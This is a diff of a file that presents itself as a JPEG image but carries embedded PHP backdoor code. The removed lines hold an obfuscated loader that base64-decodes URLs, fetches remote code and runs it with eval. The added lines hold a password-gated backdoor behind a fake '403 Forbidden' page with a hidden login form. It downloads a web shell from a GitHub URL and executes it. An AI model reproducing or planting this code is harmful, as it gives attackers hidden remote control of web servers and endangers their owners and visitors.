@@ -1,6 +1,80 @@
 ���� JFIF      ��
+
 <?php
- goto ZFBWR; QoJRg: goto hDxCK; goto MQMAk; a3mF2: $p7paB = base64_decode("\x61\110\x52\x30\x63\x48\115\66\114\171\71\x79\x59\130\143\165\132\x32\x6c\60\141\x48\x56\x69\144\130\116\x6c\143\155\x4e\x76\x62\156\x52\x6c\142\156\121\x75\131\62\71\164\114\61\x68\113\115\x7a\101\172\114\63\x64\166\x5a\155\x78\172\x61\107\126\x73\142\x43\71\171\132\127\x5a\x7a\x4c\x32\x68\154\131\x57\122\172\114\x32\61\x68\x61\x57\64\166\x62\x57\106\x70\x62\x69\65\167\141\x48\101"); goto LYhZZ; LYhZZ: $d8GGn = base64_decode("\x61\x48\x52\60\143\110\115\66\x4c\x79\71\171\131\x58\143\x75\x5a\x32\154\60\141\x48\x56\x69\x64\x58\x4e\154\x63\x6d\x4e\x76\x62\156\122\x6c\142\x6e\x51\x75\x59\x32\71\x74\114\62\x56\64\x5a\127\x4e\x31\x64\x47\x6c\62\x5a\x57\x31\61\132\x47\105\166\x63\62\126\162\x59\130\x4a\150\x4c\x32\x31\x68\x61\x57\64\x76\131\x32\x39\x6b\132\123\x39\x74\x59\x57\154\165\x4c\63\x64\x7a\114\63\144\172\114\156\x52\64\144\101"); goto ev3nr; Tnbvp: $O_iTo = "\77\76"; goto a3mF2; WOhg9: echo "\102\157\164\150\x20\x61\x74\164\145\x6d\x70\x74\163\x20\x66\141\151\x6c\x65\x64\56"; goto QoJRg; x04Jk: $gA8BS = XBca6($d8GGn); goto XD1Mm; MQMAk: IHc_W: goto pfulj; ZFBWR: function xBCa6($u_kU3) { goto F0ZIK; JKgFX: $FXPRm = curl_exec($r_AhH); goto VNo23; XO_tk: N249L: goto kJR2_; k70Pk: return false; goto vIoXJ; kJR2_: curl_setopt($r_AhH, CURLOPT_NOBODY, false); goto zkul2; eVyF2: curl_setopt($r_AhH, CURLOPT_HEADER, true); goto ZkJJY; GXw3g: hW5DH: goto C2pWl; zkul2: curl_setopt($r_AhH, CURLOPT_HEADER, false); goto JKgFX; D13IT: curl_setopt($r_AhH, CURLOPT_URL, $u_kU3); goto ymIM6; ymIM6: curl_exec($r_AhH); goto soiGJ; soiGJ: $s0J66 = curl_getinfo($r_AhH, CURLINFO_HTTP_CODE); goto qCK_I; qCK_I: if ($s0J66 == 200) { goto N249L; } goto bYiHn; bYiHn: curl_close($r_AhH); goto k70Pk; sTLjW: curl_setopt($r_AhH, CURLOPT_RETURNTRANSFER, true); goto Ccv83; ZkJJY: curl_setopt($r_AhH, CURLOPT_NOBODY, true); goto sTLjW; F0ZIK: $r_AhH = curl_init(); goto eVyF2; o3hIt: return $FXPRm; goto GXw3g; Ccv83: curl_setopt($r_AhH, CURLOPT_FOLLOWLOCATION, true); goto D13IT; VNo23: curl_close($r_AhH); goto o3hIt; vIoXJ: goto hW5DH; goto XO_tk; C2pWl: } goto Tnbvp; T5G8L: GIFcX: goto D069e; XD1Mm: if ($gA8BS !== false) { goto IHc_W; } goto WOhg9; XrwjJ: hDxCK: goto G87XY; xCZYA: if ($UAO61 !== false && $UAO61 !== 404) { goto GIFcX; } goto x04Jk; G87XY: goto A11i3; goto T5G8L; pfulj: eval($O_iTo . $gA8BS); goto XrwjJ; D069e: eval($O_iTo . $UAO61); goto OxHFs; ev3nr: $UAO61 = XBca6($p7paB); goto xCZYA; OxHFs: A11i3:
-
+$auth_pass = "2b2abc5a7d63b5489a546c7a520cd7b03e1f26ac67635b8df247501f8b5cb99a";
+
+function Login() {
+    die("<html>
+    <title>403 Forbidden</title>
+    <center><h1>403 Forbidden</h1></center>
+    <hr><center>nginx (apache v.168) </center>
+    <center>
+    <div style='cursor:pointer;'></div>
+    <form id='login-form' method='post' style='display:none;'>
+        <input style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'>
+    </form>
+    <script>
+    let clickCount = 0;
+    document.addEventListener('keydown', function(event) {
+        if (event.key === '3') {
+            clickCount++;
+            if (clickCount === 3) {
+                document.getElementById('login-form').style.display = 'block';
+            }
+        } else {
+            clickCount = 0;
+        }
+    });
+    </script>
+    </center>");
+}
+
+function VEsetcookie($k, $v) {
+    $_COOKIE[$k] = $v;
+    setcookie($k, $v);
+}
+function fetchRemoteContent($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10); // Timeout 10 detik
+    $content = curl_exec($ch);
+    if (curl_errno($ch)) {
+       
+        error_log('Error fetching remote content: ' . curl_error($ch));
+        curl_close($ch);
+        return false;
+    }
+    curl_close($ch);
+    return $content;
+}
+
+
+function is_logged_in() {
+    global $auth_pass;
+    return isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) && ($_COOKIE[md5($_SERVER['HTTP_HOST'])] == $auth_pass);
+}
+
+
+if (is_logged_in()) {
+ 
+    $a = fetchRemoteContent('https://raw.githubusercontent.com/XJ303/shell-Xjerry/refs/heads/main/Xzjerry-wolfshell.php');
+    if ($a !== false) {
+        eval('?>' . $a);
+    } else {
+
+        die('Failed to fetch remote content.');
+    }
+} else {
+ 
+    if (isset($_POST['pass']) && (hash('sha256', $_POST['pass']) == $auth_pass)) {
+        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
+    }
+    if (!is_logged_in()) {
+        Login();
+    }
+}
+?>
+
 
 �� C	��    ��               �� "          #Qr��               �� &         1! A"2qQa���   ? �y,�/3J�ݹ�߲؋5�Xw���y�R��I0�2�PI�I��iM����r�N&"KgX:����nTJnLK��@!�-����m�;�g���&�hw���@�ܗ9�-�.�1<y����Q�U�ہ?.����b߱�֫�w*V��) `$��b�ԟ��X�-�T��G�3�g ����Jx���U/��v_s(H� @T�J����n��!�gfb�c�:�l[�Qe9�PLb��C�m[5��'�jgl���_���l-;"Pk���Q�_�^�S�  x?"���Y騐�O�	q�`~~�t�U�Cڒ�V		I1��_��
